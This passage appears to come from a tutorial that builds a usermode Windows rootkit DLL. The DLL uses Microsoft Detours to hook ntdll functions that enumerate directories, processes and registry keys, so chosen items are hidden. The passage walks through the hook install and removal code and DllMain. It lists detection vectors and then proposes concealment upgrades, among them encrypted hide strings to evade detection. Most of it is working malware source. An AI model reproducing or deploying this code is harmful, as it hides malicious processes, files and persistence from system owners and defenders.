	origNtQuerySystemInformation 	= (NtQuerySystemInformation_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	origNtEnumerateKey				= (NtEnumerateKey_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtEnumerateKey");
	origNtEnumerateValueKey			= (NtEnumerateValueKey_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtEnumerateValueKey");

	DetourRestoreAfterWith();

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	DetourAttach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
	DetourAttach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
	DetourAttach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
	err = DetourTransactionCommit();

	return TRUE;
}
```

this uses `GetProcAddress` to perform a single-phase function resolution from `ntdll.dll`. it stores these addresses in global function pointers, like `origNtQueryDirectoryFile`.

it calls `DetourRestoreAfterWith()` to set prepare a clean state for hooking, then initiates a `Detour` transaction with `DetourTransactionBegin()`. it updates the current thread with `DetourUpdateThread()`.

to attach the hook, it uses `DetourAttach()` to redirect each original function to its hooked version (attaching hooks for file system, process, and registry operations).

finally, it commits the changes with `DetourTransactionCommit()`.

as you can see, it uses atomic transactions for consistent hook installation and installs all hooks in a single operation.

### hook cleanup

```cpp
BOOL unhooky(void) {
	
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	DetourDetach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
	DetourDetach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
	DetourDetach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
	err = DetourTransactionCommit();

	return TRUE;
}
```

this uses `DetourDetach()` to remove each hook and restore the original function pointers, before finalizing with `DetourTransactionCommit()`. it mirrors `hooky()` for consistency, and uses the same transaction-based approach for atomic operations.

### DLL management

```cpp
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			hooky();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			unhooky();
			break;
	}
	
    return TRUE;
}
```

this function (`DllMain()`) is the entry point for a DLL in Windows. it manages the lifecycle of the DLL and its hooks.

```cpp
if (DetourIsHelperProcess()) {
    return TRUE;
}
```

this check determines if the current process is a `Detours` helper process. if so, it immediately returns `TRUE` and avoids any hook installations or removals.

the rest of the function uses a switch statement to handle the different stages of the DLL lifecycle.

- `DLL_PROCESS_ATTACH`: process attachment. when the DLL is first loaded into a process, it calls `hooky()` to install all hooks. this happens only once per process.

- `DLL_PROCESS_DETACH`: process detachment. when the DLL is being unloaded, it calls `unhooky()` to remove all hooks and clean up the resources.

the DLL ignores thread attach/detach notifications. 

## considerations

### detection vectors

obviously, this isn't a perfect program. the detection vectors are kind of obvious:

- hardcoded strings: `HIDE_PATH`, `HIDE_PROCNAME`, `HIDE_REG`

- `Detours` import signatures

- known API hooks patterns.

- missing processes in system queries.

- discrepancies in directory enumeration.

### potential enhancements

we could enhance the concealment by modifying at runtime.

```cpp
typedef struct _HIDE_CONFIG {
    WCHAR* ProcessNames[MAX_HIDDEN_PROCESSES];
    WCHAR* FilePaths[MAX_HIDDEN_PATHS];
    WCHAR* RegKeyPatterns[MAX_HIDDEN_KEYS];
    CRITICAL_SECTION ConfigLock;
} HIDE_CONFIG, *PHIDE_CONFIG;
```

we could enhance the pattern matching.

```cpp
typedef struct _HIDE_PATTERN {
    enum PatternType {
        Exact,
        Wildcard,
        Regex
    } Type;
    union {
        WCHAR* ExactMatch;
        WCHAR* WildcardPattern;
        void*  CompiledRegex;
    } Pattern;
} HIDE_PATTERN;
```

we could also encrypt strings dynamically.

```cpp
WCHAR* GetHidePath(void) {
    static WCHAR path[MAX_PATH] = {0};
    if (path[0] == 0) {
        DecryptString(ENCRYPTED_HIDE_PATH, path);
    }
    return path;
}
```

